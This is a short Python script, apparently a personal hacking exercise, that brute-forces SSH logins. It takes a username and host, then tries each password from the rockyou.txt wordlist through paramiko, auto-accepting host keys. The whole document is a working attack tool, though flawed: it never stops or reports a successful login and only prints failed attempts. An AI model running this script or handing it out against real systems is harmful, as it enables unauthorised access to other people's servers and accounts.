#sshbrute.ssh
#
#Created By: Jeremiah Wenzel
#Created ON: 4/12/2022

import os
import paramiko

uname = input("Enter Username: ")
host = input("Enter IP or DNS for ssh server: ")
ssh = paramiko.SSHClient()
# Load SSH host keys.
ssh.load_system_host_keys()
# Add SSH host key automatically if needed.

ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
if os.path.exists('rockyou.txt'):
        #search file for line that matches strinkg
    with open('rockyou.txt', 'r', encoding='ANSI') as fp:
        for line in fp:
            word = line.rstrip('\n')
            #login ssh
            try:               
                ssh.connect(host, username=uname, password=word, look_for_keys=False )
            except Exception as error_message:
                print("Username:", uname, " Password:", word, "Incorrect!")
        fp.close()
else:
    print("try again when you actually have the rockyou.txt wordlist in same directory as this script!")   

